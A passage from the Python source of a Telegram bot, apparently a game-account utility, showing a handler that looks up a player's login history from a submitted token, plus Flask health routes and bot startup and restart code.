                    res = fetch_login_history_sync(text)
                    if not res.get("ok"):
                        await update.message.reply_text(f"Invalid Token: {res.get('error')}", reply_markup=get_youtube_keyboard())
                    else:
                        player = res.get("player", {})
                        records = res.get("records", [])
                        header = f"Player Info\nName: {player.get('name','Unknown')}\nID: {player.get('uid','Unknown')}\nPlatform: {player.get('platform','Unknown')}\nRegion: {player.get('region','Unknown')}\n\nLogin History ({len(records)} records)\n\n"
                        body = ""
                        if not records:
                            body = "No Records Found."
                        else:
                            for i, rec in enumerate(records[:10], 1):
                                ts_raw = rec.get('ts',0)
                                try:
                                    date_str = datetime.fromtimestamp(ts_raw).strftime('%Y-%m-%d %H:%M:%S')
                                except:
                                    date_str = str(ts_raw)
                                dev = rec.get('dev','Unknown Device')
                                arch = rec.get('arch','Unknown')
                                ram = rec.get('ram',0)
                                body += f"#{i} - {date_str}\nDevice: {dev}\nArch: {arch}\nRAM: {ram} MB\n\n"
                        await update.message.reply_text(header+body, reply_markup=get_youtube_keyboard())
                except Exception as e:
                    await update.message.reply_text(f"Error: {str(e)[:300]}", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
        return STATE_INPUT

    except Exception as e:
        print(f"handle_text error: {e}")
        import traceback
        traceback.print_exc()
        try:
            await update.message.reply_text("Error Occurred. Please Use /start", reply_markup=get_reply_keyboard())
        except:
            pass
        context.user_data.clear()
        return STATE_INPUT

flask_app = Flask(__name__)
@flask_app.route('/')
def home():
    return f"Bot Running - 15 OPTIONS FINAL - All Like CLI email.py - Owner Zevric X Play"
@flask_app.route('/health')
def health():
    return "OK"
app = flask_app

def run_bot():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("BOT_TOKEN not set!")
        return
    import asyncio
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    except:
        pass
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        conv_handler = ConversationHandler(
            entry_points=[
                CommandHandler("start", start),
                CommandHandler("menu", menu_cmd),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)
            ],
            states={STATE_INPUT: [CallbackQueryHandler(handle_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)]},
            fallbacks=[CommandHandler("cancel", cancel_cmd), CommandHandler("start", start)], allow_reentry=True, per_message=False
        )
        application.add_handler(conv_handler)
        application.add_handler(CommandHandler("cancel", cancel_cmd))
        application.run_polling(close_loop=False, drop_pending_updates=True, stop_signals=None)
    except Exception as e:
        print(f"Bot run_polling failed: {e}")
        import traceback
        traceback.print_exc()
        raise

def _auto_start_bot():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("BOT_TOKEN not set, bot thread not started")
        return
    def bot_thread_func():
        while True:
            try:
                print("Starting bot thread...")
                run_bot()
            except Exception as e:
                print(f"Bot thread crashed: {e}, restarting in 5 sec...")
                import traceback
                traceback.print_exc()
                time.sleep(5)
    try:
        t = threading.Thread(target=bot_thread_func, daemon=True)
        t.start()
        print("Bot thread auto-started")
    except Exception as e:
        print(f"Failed to start bot thread: {e}")

if os.getenv("PORT") or os.getenv("RENDER"):
    _auto_start_bot()

if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port)
